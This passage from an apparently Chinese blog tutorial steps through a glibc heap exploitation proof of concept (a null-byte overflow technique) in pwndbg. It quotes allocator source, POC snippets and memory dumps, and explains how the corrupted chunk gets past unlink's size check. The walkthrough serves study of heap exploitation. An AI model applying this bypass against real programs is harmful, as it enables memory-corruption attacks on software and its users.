class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下来来到一个比较重点的地方：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This malloc will result in a call to unlink on the chunk where b was.</span></span><br><span class="line"><span class="comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span></span><br><span class="line"><span class="comment">// will detect the heap corruption now.</span></span><br><span class="line"><span class="comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span></span><br><span class="line"><span class="comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0xa00 (was 0xa10 before the overflow)</span></span><br><span class="line"><span class="comment">// next_chunk(P) == b-0x10+0xa00 == b+0x9f0</span></span><br><span class="line"><span class="comment">// prev_size (next_chunk(P)) == *(b+0x9f0) == 0xa00</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,</span><br><span class="line">*((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>)), *(<span class="keyword">size_t</span>*)(b<span class="number">-0x10</span> + *((<span class="keyword">size_t</span>*)(b<span class="number">-0x8</span>))));</span><br><span class="line">b1 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b1: %p\n&quot;</span>,b1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span></span><br><span class="line"><span class="string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span></span><br><span class="line"><span class="string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="keyword">uint64_t</span>*)c)<span class="number">-4</span>));</span><br></pre></td></tr></table></figure><p>我们先来看一下 POC 中的注释：“接下来的 malloc 将会在调用时触发 unlink，但是为了 POC 的正常执行我们必须绕过 unlink 中的检查”，我们这里再复习一下 unlink 宏中的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))  <span class="comment">//检查双向链表的完整性</span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line"><span class="comment">//省略有关于largebin unlink的代码......</span></span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了方便理解，单步步入 POC 的 b1 = malloc(0x500)：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620104477519-da36dab4-453c-499e-ba73-189ce230ff45.png#clientId=u3c0ab4c2-3592-4&from=drop&id=u96c7a6b4&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2013.01.13.png&originHeight=1800&originWidth=2880&originalType=binary&size=405322&status=done&style=none&taskId=u030bd732-47b7-45d1-8d5d-9a894575511" alt="截屏2021-05-04 13.01.13.png"><br>如上图所示，现在 tcachebin、fastbin、smallbin、largebin 均为空，按照之前调试 malloc 的经验：</p><ol><li>向 tcachebin 申请</li><li>若 tcachebin 无法满足则向 fastbin 申请</li><li>fastbin 也不满足则向 smallbin 申请</li><li>smallbin 也无法满足要求则向 unsortedbin 申请，现在开始对 unsortedbin 中的所有 free chunk 进行整理。</li></ol><p>现在的状况就是 last_remainder 为 NULL，我们首先会对其中的 free chunk 进行解链整理，然后调试到此处：</p><blockquote><p>注意：此处的解链过程并未调用 unlink<br>其实在上面的第 4 步中省略了一些内容：<br>在整理 unsortedbin 中的 free chunk 时会首先判断当前 unsortedbin 中是否只有 last_remainder 并且当前要申请的堆块大小是否为 small chunk 且可以满足需要，如果是的话对 last_remainder 进行切割后返回；如果不成立则边整理边判断当前要整理的堆块大小是否恰好满足申请要求，如果恰好满足则直接返回；若之前的两个条件都不满足则会将 free chunk 放入 smallbin 或 largebin 中。</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620105965741-67c984c8-eb6e-4489-a232-b9261635b7a3.png#clientId=u3c0ab4c2-3592-4&from=drop&id=u8dd022be&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2013.26.01.png&originHeight=1800&originWidth=2880&originalType=binary&size=451850&status=done&style=none&taskId=u72e7640e-26e6-4031-92fc-8de6733eb9a" alt="截屏2021-05-04 13.26.01.png">如上图所示，现在我们准备将 POC 中的 0x555555757760（b 堆块）链入到 largebin 中，链入之前的内存状况如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000a00</span> <span class="meta">#b(待链入largebin中)</span></span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span> <span class="meta">#unsortedbin指针不会被清空</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x0000000000000a00</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000a10</span><span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:<span class="number">0x0000000000000000</span><span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>链入的具体过程在这里不再详说，可以参考之前的文章；链入之后效果如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620106649134-ce9d4f00-e3a1-49ff-b3de-ba1452b9e7d7.png#clientId=u3c0ab4c2-3592-4&from=drop&id=uaac0b771&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2013.37.22.png&originHeight=678&originWidth=2746&originalType=binary&size=87659&status=done&style=none&taskId=u0bb72310-c3a0-4a9c-b4ae-574f65b915e" alt="截屏2021-05-04 13.37.22.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000a00</span> <span class="meta">#b(free-largebin)</span></span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x00007ffff7dce210</span><span class="number">0x00007ffff7dce210</span> <span class="meta">#unsortedbin指针不会被清空</span></span><br><span class="line"><span class="number">0x555555757780</span>:<span class="number">0x0000555555757760</span><span class="number">0x0000555555757760</span></span><br><span class="line">    #fd_nextsize#bk_nextsize</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x0000000000000a00</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000a10</span><span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:<span class="number">0x0000000000000000</span><span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>现在 unsortedbin 中没有堆块可整理了，跳出 while 循环（跳出整理阶段），现在开始向 largebin 中申请堆块，但是难受的是 largebin 中唯一一个 free chunk 大小为 0xa00，但是我们申请的大小为 0x510，因为<strong>此时</strong>对 largebin 的分配遵守“最适大小的分配算法”，因此不会对此堆块进行切割，此时标记 bit 之后会使用 binmap 进行遍历合适的堆块（如果未找到合适堆块，则会对其进行切割）：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620107631387-e88c9295-1212-45e5-9774-ff9957ed554c.png#clientId=u3c0ab4c2-3592-4&from=drop&id=ud9899482&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2013.53.45.png&originHeight=1800&originWidth=2880&originalType=binary&size=447159&status=done&style=none&taskId=u780ba47d-f92d-449e-b348-ad01abca359" alt="截屏2021-05-04 13.53.45.png"></p><blockquote><p>关于 binmap 的讲解可以看前面的内容</p></blockquote><p>经过一些遍历之后最终找到了 largebin 中的唯一一个堆块，接下来我们对其开始切割，注意，重点来了！！！<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620108377063-25020083-b977-4135-a288-1e1972dc7c9f.png#clientId=u3c0ab4c2-3592-4&from=drop&id=u9ca73156&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2014.06.10.png&originHeight=746&originWidth=2748&originalType=binary&size=103328&status=done&style=none&taskId=ua9e8d279-8202-423b-8958-66000fcf28a" alt="截屏2021-05-04 14.06.10.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">          size = chunksize (victim); <span class="comment">//size==0xa00（注意victim的原大小为0xa10）</span></span><br><span class="line"> <span class="comment">//nb==0x510</span></span><br><span class="line">          <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">          assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"><span class="comment">//largebin中的第一个堆块一定可以满足所要申请的大小</span></span><br><span class="line"></span><br><span class="line">          remainder_size = size - nb; <span class="comment">//计算切割后的大小：remainder_size==0x4f0</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* unlink */</span></span><br><span class="line">          unlink (av, victim, bck, fwd); <span class="comment">//对largebin中的进行解链</span></span><br><span class="line"><span class="comment">//......</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>注意这里的 unlink 的检查，这里省略了 largebin 的相关解链代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">        <span class="comment">//chunksize(P)==0xa00 #不包括标志位</span></span><br><span class="line">        <span class="comment">//prev_size (next_chunk(P))==0xa00</span></span><br><span class="line">        <span class="comment">//绕过检查！！！</span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))  <span class="comment">//检查双向链表的完整性</span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"><span class="comment">//这里的检查并没有什么用，因为我们并没有修改双向链表</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="comment">//对largebin的fd_nextsize和bk_nextsize进行检查</span></span><br><span class="line"><span class="comment">//省略有关于largebin unlink的代码......</span></span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br></pre></td></tr></table></figure><p>解链效果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000a00</span></span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x00007ffff7dce210</span><span class="number">0x00007ffff7dce210</span></span><br><span class="line"><span class="number">0x555555757780</span>:<span class="number">0x0000555555757760</span><span class="number">0x0000555555757760</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x0000000000000a00</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000a10</span><span class="number">0x0000000000000510</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:<span class="number">0x0000000000000000</span><span class="number">0x000000000001f871</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>接下来开始切割，如下代码会省略一些内容，只保留框架：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line"><span class="comment">//......</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span> <span class="comment">//开始切割</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb); <span class="comment">//remainder==0x555555757c70</span></span><br><span class="line">#############################################################################<span class="meta">#</span></span><br><span class="line"><span class="meta">pwndbg&gt; x/800gx 0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000a00</span></span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x00007ffff7dce210</span><span class="number">0x00007ffff7dce210</span></span><br><span class="line"><span class="number">0x555555757780</span>:<span class="number">0x0000555555757760</span><span class="number">0x0000555555757760</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span> &lt;-在此切割（remainder==<span class="number">0x555555757c70</span>）</span><br><span class="line"><span class="number">0x555555757c80</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x0000000000000a00</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000a10</span><span class="number">0x0000000000000510</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:<span class="number">0x0000000000000000</span><span class="number">0x000000000001f871</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br><span class="line">##############################################################################</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck)) <span class="comment">//链入前检查unsortedbin双向链表的完整性</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);</span><br><span class="line"><span class="comment">//将切割后余下的堆块扔进unsortedbin中......</span></span><br><span class="line">#############################################################################<span class="meta">#</span></span><br><span class="line"><span class="meta">pwndbg&gt; x/800gx 0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000a00</span></span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x00007ffff7dce210</span><span class="number">0x00007ffff7dce210</span></span><br><span class="line"><span class="number">0x555555757780</span>:<span class="number">0x0000555555757760</span><span class="number">0x0000555555757760</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span> &lt;-在此切割（remainder==<span class="number">0x555555757c70</span>）</span><br><span class="line"><span class="number">0x555555757c80</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">    <span class="meta">#fd#bk</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:<span class="number">0x0000000000000a00</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:<span class="number">0x0000000000000a10</span><span class="number">0x0000000000000510</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:<span class="number">0x0000000000000000</span><span class="number">0x000000000001f871</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555757c70</span> —▸ <span class="number">0x7ffff7dcdca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555757c70</span> <span class="comment">/* &#x27;p|uUUU&#x27; */</span></span><br><span class="line">##############################################################################</span><br><span class="line">                  <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">                  <span class="keyword">if</span> (in_smallbin_range (nb)) <span class="comment">//nb==0x510</span></span><br><span class="line">                    av-&gt;last_remainder = remainder; <span class="comment">//不会链入到last_remainder中</span></span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size)) <span class="comment">//remainder_size==0x4f0</span></span><br><span class="line">                    &#123; <span class="comment">//设置fd_nextsize和bk_nextsize</span></span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">#############################################################################<span class="meta">#</span></span><br><span class="line"><span class="meta">pwndbg&gt; x/800gx 0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000511</span> &lt;-victim</span><br><span class="line">    #原:<span class="number">0x0000000000000a00</span></span><br><span class="line">    #set_head[victim]</span><br><span class="line"><span class="number">0x555555757770</span>:<span class="number">0x00007ffff7dce210</span><span class="number">0x00007ffff7dce210</span></span><br><span class="line"><span class="number">0x555555757780</span>:<span class="number">0x0000555555757760</span><span class="number">0x0000555555757760</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000004f1</span> &lt;-在此切割（remainder==<span class="number">0x555555757c70</span>）</span><br><span class="line">    #原:<span 